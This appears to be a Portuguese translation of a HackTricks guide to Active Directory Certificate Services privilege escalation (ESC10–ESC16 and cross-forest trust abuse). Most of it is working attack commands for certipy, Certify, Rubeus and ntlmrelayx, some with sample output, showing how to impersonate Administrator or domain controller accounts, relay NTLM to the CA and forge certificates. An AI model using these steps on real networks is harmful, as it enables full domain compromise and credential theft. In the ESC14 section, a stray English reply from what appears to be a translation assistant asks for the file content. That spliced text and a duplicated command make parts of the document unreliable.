## Mapeamentos de Certificados Fracos - ESC10

### Explicação

Dois valores de chaves de registro no controlador de domínio são referidos pelo ESC10:

- O valor padrão para `CertificateMappingMethods` em `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` é `0x18` (`0x8 | 0x10`), anteriormente definido como `0x1F`.
- A configuração padrão para `StrongCertificateBindingEnforcement` em `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` é `1`, anteriormente `0`.

**Caso 1**

Quando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Se `CertificateMappingMethods` incluir o bit `UPN` (`0x4`).

### Caso de Abuso 1

Com `StrongCertificateBindingEnforcement` configurado como `0`, uma conta A com permissões `GenericWrite` pode ser explorada para comprometer qualquer conta B.

Por exemplo, tendo permissões `GenericWrite` sobre `Jane@corp.local`, um atacante pretende comprometer `Administrator@corp.local`. O procedimento espelha o ESC9, permitindo que qualquer template de certificado seja utilizado.

Inicialmente, o hash de `Jane` é obtido usando Shadow Credentials, explorando o `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Em seguida, o `userPrincipalName` de `Jane` é alterado para `Administrator`, omitindo deliberadamente a parte `@corp.local` para evitar uma violação de restrição.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Em seguida, um certificado que permite autenticação de cliente é solicitado como `Jane`, usando o template padrão `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
O `userPrincipalName` de `Jane` é então revertido ao seu valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticar-se com o certificado obtido retornará o NT hash de `Administrator@corp.local`, exigindo que o domínio seja especificado no comando devido à ausência de informações de domínio no certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de Abuso 2

Com `CertificateMappingMethods` contendo o flag de bit `UPN` (`0x4`), uma conta A com permissões `GenericWrite` pode comprometer qualquer conta B que não possua a propriedade `userPrincipalName`, incluindo contas de máquina e o administrador de domínio integrado `Administrator`.

Aqui, o objetivo é comprometer `DC$@corp.local`, começando por obter o hash de `Jane` através de Shadow Credentials, aproveitando o `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
O `userPrincipalName` de `Jane` é então definido como `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Um certificado para autenticação de cliente é solicitado como `Jane` usando o modelo padrão `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
O `userPrincipalName` de `Jane` é revertido ao seu original após este processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticar via Schannel, a opção `-ldap-shell` do Certipy é utilizada, indicando sucesso na autenticação como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Através do shell LDAP, comandos como `set_rbcd` permitem ataques de Resource-Based Constrained Delegation (RBCD), potencialmente comprometendo o controlador de domínio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidade também se estende a qualquer conta de usuário que não possua um `userPrincipalName` ou em que ele não coincida com o `sAMAccountName`, sendo a conta padrão `Administrator@corp.local` um alvo principal devido aos seus privilégios LDAP elevados e à ausência de um `userPrincipalName` por padrão.

## Reencaminhamento de NTLM para ICPR - ESC11

### Explicação

Se o CA Server não estiver configurado com `IF_ENFORCEENCRYPTICERTREQUEST`, isso pode permitir NTLM relay attacks sem assinatura via serviço RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Você pode usar `certipy` para enumerar se `Enforce Encryption for Requests` está Disabled e o `certipy` mostrará as vulnerabilidades `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

É necessário configurar um servidor de relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para controladores de domínio, devemos especificar `-template` em DomainController.

Ou usando [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explicação

Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".

Se um dispositivo USB estiver conectado ao servidor CA via uma porta USB, ou a um USB device server no caso do servidor CA ser uma máquina virtual, uma chave de autenticação (às vezes referida como "password") é requerida para o Key Storage Provider gerar e utilizar chaves no YubiHSM.

Essa chave/password é armazenada no registro em `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` em texto não cifrado.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Cenário de Abuso

Se a chave privada da CA estiver armazenada em um dispositivo USB físico quando você obtiver shell access, é possível recuperar a chave.

Primeiro, você precisa obter o certificado da CA (isto é público) e então:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finalmente, use o comando certutil `-sign` para forjar um novo certificado arbitrário usando o certificado CA e sua chave privada.

## OID Group Link Abuse - ESC13

### Explicação

O atributo `msPKI-Certificate-Policy` permite que a política de emissão seja adicionada ao template de certificado. Os objetos `msPKI-Enterprise-Oid` responsáveis por emitir políticas podem ser descobertos no Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) do container PKI OID. Uma política pode ser vinculada a um AD group usando o atributo `msDS-OIDToGroupLink` desse objeto, permitindo que um sistema autorize um usuário que apresente o certificado como se ele fosse membro do grupo. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Em outras palavras, quando um usuário tem permissão para solicitar um certificado e o certificado está vinculado a um OID group, o usuário pode herdar os privilégios desse grupo.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Cenário de Abuso

Encontre uma permissão de usuário — pode usar `certipy find` ou `Certify.exe find /showAllPermissions`.

Se `John` tiver permissão para enroll no `VulnerableTemplate`, o usuário pode herdar os privilégios do grupo `VulnerableGroup`.

Tudo o que precisa fazer é especificar o template; ele receberá um certificado com direitos OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuração vulnerável de renovação de certificados - ESC14

### Explicação

A descrição em https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping é notavelmente completa. Abaixo está uma citação do texto original.

ESC14 addresses vulnerabilities arising from "weak explicit certificate mapping", primarily through the misuse or insecure configuration of the `altSecurityIdentities` attribute on Active Directory user or computer accounts. This multi-valued attribute allows administrators to manually associate X.509 certificates with an AD account for authentication purposes. When populated, these explicit mappings can override the default certificate mapping logic, which typically relies on UPNs or DNS names in the SAN of the certificate, or the SID embedded in the `szOID_NTDS_CA_SECURITY_EXT` security extension.

A "weak" mapping occurs when the string value used within the `altSecurityIdentities` attribute to identify a certificate is too broad, easily guessable, relies on non-unique certificate fields, or uses easily spoofable certificate components. If an attacker can obtain or craft a certificate whose attributes match such a weakly defined explicit mapping for a privileged account, they can use that certificate to authenticate as and impersonate that account.

Exemplos de strings de mapeamento potencialmente fracas em `altSecurityIdentities` incluem:

- Mapeamento apenas pelo Subject Common Name (CN) comum: por exemplo, `X509:<S>CN=SomeUser`. Um atacante pode conseguir obter um certificado com esse CN a partir de uma fonte menos segura.
- Uso de Issuer Distinguished Names (DNs) ou Subject DNs excessivamente genéricos sem qualificação adicional como um número de série específico ou subject key identifier: por exemplo, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Emprego de outros padrões previsíveis ou identificadores não criptográficos que um atacante possa satisfazer em um certificado que possa obter legitimamente ou forjar (se tiver comprometido uma CA ou encontrado um template vulnerável como em ESC1).

O atributo `altSecurityIdentities` suporta vários formatos para mapeamento, tais como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapeia pelo Issuer e Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (mapeia pelo valor da extensão Subject Key Identifier do certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapeia pelo número de série, implicitamente qualificado pelo Issuer DN) - isto não é um formato padrão, normalmente é `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapeia por um nome RFC822, tipicamente um endereço de e-mail, a partir do SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapeia por um hash SHA1 da chave pública bruta do certificado - geralmente forte)

A segurança desses mapeamentos depende fortemente da especificidade, unicidade e força criptográfica dos identificadores de certificado escolhidos na string de mapeamento. Mesmo com modos fortes de vinculação de certificados habilitados em Domain Controllers (que afetam principalmente mapeamentos implícitos baseados em SAN UPNs/DNS e na extensão SID), uma entrada `altSecurityIdentities` mal configurada ainda pode apresentar um caminho direto para falsificação de identidade se a própria lógica de mapeamento for falha ou permissiva demais.

### Cenário de Abuso

ESC14 targets **explicit certificate mappings** in Active Directory (AD), specifically the `altSecurityIdentities` attribute. If this attribute is set (by design or misconfiguration), attackers can impersonate accounts by presenting certificates that match the mapping.

#### Cenário A: Atacante pode escrever em `altSecurityIdentities`

**Pré-condição**: O atacante tem permissões de escrita no atributo `altSecurityIdentities` da conta alvo ou a permissão para concedê-lo na forma de uma das seguintes permissões no objeto AD alvo:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Cenário B: Alvo possui mapeamento fraco via X509RFC822 (Email)

- **Pré-condição**: O alvo tem um mapeamento X509RFC822 fraco em altSecurityIdentities. Um atacante pode definir o atributo mail da vítima para corresponder ao nome X509RFC822 do alvo, solicitar um certificado em nome da vítima e usá-lo para autenticar-se como o alvo.

#### Cenário C: Alvo possui mapeamento X509IssuerSubject

- **Pré-condição**: O alvo tem um mapeamento explícito X509IssuerSubject fraco em `altSecurityIdentities`. O atacante pode definir o atributo `cn` ou `dNSHostName` em um principal vítima para corresponder ao subject do mapeamento X509IssuerSubject do alvo. Em seguida, o atacante pode solicitar um certificado em nome da vítima e usar esse certificado para autenticar-se como o alvo.

#### Cenário D: Alvo possui mapeamento X509SubjectOnly

- **Pré-condição**: O alvo tem um mapeamento explícito X509SubjectOnly fraco em `altSecurityIdentities`. O atacante pode definir o atributo `cn` ou `dNSHostName` em um principal vítima para corresponder ao subject do mapeamento X509SubjectOnly do alvo. Em seguida, o atacante pode solicitar um certificado em nome da vítima e usar esse certificado para autenticar-se como o alvo.

### operações concretas
#### Cenário A

Solicitar um certificado do template de certificado `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Salvar e converter o certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticar (usando o certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
I don't have the file content. Please paste the markdown from src/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md (or attach the text) so I can translate it to Portuguese and clean it up as requested. If by "Cleanup (optional)" you mean specific edits (style, punctuation, remove TODOs), say which.
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explicação

A descrição em https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc é excepcionalmente detalhada. Abaixo está uma citação do texto original.

Usando templates de certificado versão 1 padrão incorporados, um atacante pode criar um CSR para incluir application policies que são preferidas em relação aos atributos de Extended Key Usage configurados especificados no template. O único requisito são direitos de inscrição, e isso pode ser usado para gerar certificados de autenticação de cliente, agente de solicitação de certificado e assinatura de código usando o template **_WebServer_**.

### Abuso

O seguinte faz referência a [este link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Clique para ver métodos de uso mais detalhados.


Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Cenário A: Direct Impersonation via Schannel

**Passo 1: Solicitar um certificado, injetando a Application Policy "Client Authentication" e o UPN alvo.** Atacante `attacker@corp.local` mira em `administrator@corp.local` usando o template "WebServer" V1 (which allows enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: O template V1 vulnerável com "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injeta o OID `1.3.6.1.5.5.7.3.2` na extensão Application Policies do CSR.
- `-upn 'administrator@corp.local'`: Define o UPN no SAN para impersonação.

**Passo 2: Autentique via Schannel (LDAPS) usando o certificado obtido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Cenário B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Passo 1: Solicitar um certificado de um template V1 (com "Enrollee supplies subject"), injetando a Application Policy "Certificate Request Agent".** Este certificado é para o atacante (`attacker@corp.local`) se tornar um enrollment agent. Nenhum UPN é especificado para a própria identidade do atacante aqui, pois o objetivo é a capacidade de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injeta OID `1.3.6.1.4.1.311.20.2.1`.

**Passo 2: Use o certificado "agent" para solicitar um certificado em nome de um usuário alvo privilegiado.** Esta é uma etapa semelhante ao ESC3, usando o certificado do Passo 1 como o certificado agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Passo 3: Autentique-se como o usuário privilegiado usando o certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Extensão de Segurança Desativada na CA (Globalmente) - ESC16

### Explicação

**ESC16 (Elevação de Privilégio via Ausência da Extensão szOID_NTDS_CA_SECURITY_EXT)** refere-se ao cenário em que, se a configuração do AD CS não exigir a inclusão da extensão **szOID_NTDS_CA_SECURITY_EXT** em todos os certificados, um atacante pode explorar isso ao:

1. Solicitar um certificado **sem vinculação de SID**.

2. Usar esse certificado **para autenticação como qualquer conta**, por exemplo, se passando por uma conta de alto privilégio (p.ex., um Administrador de Domínio).

Você também pode consultar este artigo para saber mais sobre o princípio detalhado: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuso

O seguinte faz referência a [este link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Clique para ver métodos de uso mais detalhados.

Para identificar se o ambiente Active Directory Certificate Services (AD CS) é vulnerável ao **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Passo 1: Ler o UPN inicial da conta da vítima (Opcional - para restauração).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Passo 2: Atualize o UPN da conta da vítima para o `sAMAccountName` do administrador alvo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Etapa 3: (Se necessário) Obter credenciais da conta "vítima" (p.ex., via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Passo 4: Solicite um certificado como o usuário "victim" a partir de _qualquer template de autenticação de cliente adequado_ (por exemplo, "User") na CA vulnerável ao ESC16.** Como a CA é vulnerável ao ESC16, ela irá automaticamente omitir a extensão de segurança SID do certificado emitido, independentemente das configurações específicas do template para essa extensão. Defina a variável de ambiente do cache de credenciais do Kerberos (comando shell):
```bash
export KRB5CCNAME=victim.ccache
```
Em seguida, solicite o certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Etapa 5: Reverter o UPN da conta "vítima".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Etapa 6: Autenticar-se como o administrador alvo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Comprometendo Florestas com Certificados Explicado em Voz Passiva

### Quebra de Confianças entre Florestas por CAs Comprometidas

A configuração para **cross-forest enrollment** é relativamente simples. O **root CA certificate** da floresta de recursos é **publicado nas florestas de contas** pelos administradores, e os certificados de **enterprise CA** da floresta de recursos são **adicionados aos `NTAuthCertificates` e AIA containers em cada floresta de contas**. Para esclarecer, esse arranjo concede à **CA na floresta de recursos controle completo** sobre todas as outras florestas para as quais ela gerencia o PKI. Caso essa CA seja **comprometida por atacantes**, certificados para todos os usuários tanto da floresta de recursos quanto das florestas de contas poderiam ser **forjados por eles**, quebrando assim a fronteira de segurança da floresta.

### Privilégios de Inscrição Concedidos a Principais Estrangeiros

Em ambientes com múltiplas florestas, é preciso ter cautela em relação a Enterprise CAs que **publicam certificate templates** que permitem que **Authenticated Users or foreign principals** (usuários/grupos externos à floresta à qual a Enterprise CA pertence) tenham **direitos de enrollment e edição**.  
Ao autenticar-se através de um trust, o **Authenticated Users SID** é adicionado ao token do usuário pelo AD. Assim, se um domínio possui uma Enterprise CA com um template que **allows Authenticated Users enrollment rights**, um template poderia potencialmente ser **enrolled in by a user from a different forest**. Da mesma forma, se **enrollment rights are explicitly granted to a foreign principal by a template**, uma relação de controle de acesso entre florestas é criada, permitindo que um principal de uma floresta **enroll in a template from another forest**.

Ambos os cenários levam a um aumento da superfície de ataque de uma floresta para outra. As configurações do certificate template podem ser exploradas por um atacante para obter privilégios adicionais em um domínio estrangeiro.


## Referências

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
